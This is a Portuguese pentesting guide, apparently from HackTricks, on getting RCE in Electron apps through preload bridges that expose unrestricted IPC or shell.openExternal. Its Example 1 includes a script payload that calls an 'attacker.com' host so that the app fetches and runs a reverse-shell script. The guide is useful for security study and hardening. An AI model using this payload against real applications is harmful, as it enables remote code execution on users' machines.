# Electron contextIsolation RCE via IPC

{{#include ../../banners/hacktricks-training.md}}

O context isolation não torna segura uma bridge de preload insegura. Se um preload expõe IPC privilegiado ao conteúdo do renderer, um XSS ou renderer comprometido pode chamar essa bridge; o RCE depende então da validação e das capacidades do handler correspondente no processo principal. O Electron recomenda expor um único método restrito por operação, validar os remetentes de IPC e nunca expor primitivas brutas de IPC.<sup>[[3]](#references)[[4]](#references)</sup>

**A maioria destes exemplos foi retirada daqui** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Assista ao vídeo para obter mais informações.<sup>[[1]](#references)</sup>

## Exemplo 0

Exemplo de [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (os slides mostram o exemplo completo de como o MS Teams foi explorado de XSS a RCE; este é apenas um exemplo muito básico):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Exemplo 1

Veja como o `main.js` escuta por `getUpdate` e **baixa e executa qualquer URL** recebida.\
Veja também como o `preload.js` **expõe qualquer evento IPC** do processo principal.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Exemplo 2

Se o preload expõe `shell.openExternal` sem validação de scheme e destino, uma entrada controlada pelo renderer pode iniciar manipuladores externos registrados. Isso se transformar em execução de código depende da plataforma, dos manipuladores instalados, do scheme e da versão do Electron; restrinja-o a uma allowlist explícita de destinos `https:` esperados.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Exemplo 3

Se o preload expõe comunicação irrestrita com o processo principal, um XSS pode enviar nomes de canais e dados arbitrários. O impacto depende dos handlers IPC registrados e de suas verificações de autorização.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [Workshop de Hacking de Aplicativos Modernos para Desktop com XSS e RCE](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Como hackeei o Microsoft Teams e ganhei US$ 150.000 no Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — Lista de verificação de segurança](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — Isolamento de contexto e exposição segura de API](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
